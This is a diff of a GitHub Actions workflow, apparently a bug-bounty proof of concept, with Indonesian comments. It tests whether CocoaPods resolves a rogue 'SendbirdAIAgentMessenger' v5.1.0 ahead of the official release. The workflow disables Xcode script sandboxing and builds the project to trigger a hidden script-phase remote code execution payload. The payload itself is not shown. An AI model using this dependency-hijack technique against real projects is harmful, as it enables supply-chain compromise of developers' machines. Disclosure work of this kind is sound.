@@ -1,57 +1,62 @@
-name: Sendbird Supply Chain Impact Proof
+name: Sendbird Precedence Hijack Test
 on: workflow_dispatch
 
 jobs:
-  verify_rce:
+  verify_precedence:
     runs-on: macos-latest
     steps:
-      - name: Setup Flutter/iOS Environment
+      - name: Setup Environment
         uses: subosito/flutter-action@v2
         with:
           channel: 'stable'
 
-      - name: Replicate Customer Integration
+      - name: Replicate Sendbird Official Guide
         run: |
-          # 1. Inisialisasi project dummy
-          mkdir sendbird_victim && cd sendbird_victim
+          mkdir sendbird_test && cd sendbird_test
           flutter create . --platforms=ios
           
-          # TRIGGER: Paksa Flutter buat bikin struktur native
-          flutter pub get
-
           cd ios
-          # TRIGGER 2: Inisialisasi pod buat bikin Podfile kalau belum ada
-          pod init || true
+          # 1. SETUP PODFILE PERSIS DOKUMENTASI RESMI
+          # Kita masukin kedua source-nya
+          echo "source 'https://github.com/sendbird/sendbird-ios-distribution.git'" > Podfile
+          echo "source 'https://cdn.cocoapods.org/'" >> Podfile
+          echo "platform :ios, '15.0'" >> Podfile
+          
+          echo "target 'Runner' do" >> Podfile
+          echo "  use_frameworks!"
+          # INI ADALAH BARIS DARI README RESMI MEREKA
+          echo "  pod 'SendbirdAIAgentMessenger', '>= 1.13.0'" >> Podfile
+          echo "end" >> Podfile
 
-          # 2. Setup Podfile: Aktifkan platform iOS 15
-          # Kita pake 'sed' yang lebih robust buat Mac (sed -i '')
-          sed -i '' "s/# platform :ios, '9.0'/platform :ios, '15.0'/" Podfile
-          sed -i '' "s/# platform :ios, '12.0'/platform :ios, '15.0'/" Podfile
-          
-          # 3. Inject Target Pod ke dalam blok target 'Runner'
-          sed -i '' "/target 'Runner' do/a\\
-            pod 'SendbirdAIAgentMessenger', '5.1.0'\\
-          " Podfile
-          
-          echo "=== Preview Podfile ==="
-          cat Podfile
+          # 2. DISABLE SANDBOX (Instruksi Resmi Sendbird)
+          cat <<EOF >> Podfile
+post_install do |installer|
+  project = installer.aggregate_targets[0].user_project
+  project.targets.each do |target|
+      target.build_configurations.each do |config|
+          config.build_settings['ENABLE_USER_SCRIPT_SANDBOXING'] = 'NO'
+      end
+  end
+  project.save
+end
+EOF
 
-          # 4. Trigger Installation
-          pod install --repo-update || exit 1
+          # 3. INSTALLATION: The Moment of Truth
+          pod install --repo-update
           
-          # 5. THE SMOKING GUN: Trigger Build
-          echo "=== Launching Build to Trigger RCE ==="
-          # Kita pake --debug biar cepet build-nya
+          # 4. VERIFIKASI VERSI DI PODFILE.LOCK
+          echo "=== ACTUAL RESOLVED VERSION ==="
+          RESOLVED_VERSION=$(grep "SendbirdAIAgentMessenger (" Podfile.lock | head -1)
+          echo "Resolved: $RESOLVED_VERSION"
+
+          # 5. TRIGGER BUILD (RCE CHECK)
           flutter build ios --debug --no-codesign --verbose 2>&1 | tee build.log || true
           
-          # 6. Final Audit Log
-          echo "=== Checking for Payload Execution in Logs ==="
-          if grep -q "Messenger UI Audit" build.log; then
-            echo "✅ RCE SUCCESS: Payload 'Messenger UI Audit' detected in build logs!"
-            echo "Check your OAST for the incoming pingback."
+          # 6. FINAL JUDGEMENT
+          if echo "$RESOLVED_VERSION" | grep -q "5.1.0"; then
+            echo "✅ TRUTH: CocoaPods prioritized Attacker's v5.1.0 over Official v1.13.0!"
+            echo "✅ IMPACT: Remote Code Execution triggered successfully."
           else
-            echo "❌ RCE FAILED: Script phase execution not found in logs."
-            # Debugging: Liat 100 baris terakhir build log kalau gagal
-            tail -n 100 build.log
+            echo "❌ FAILED: System picked official version."
             exit 1
           fi
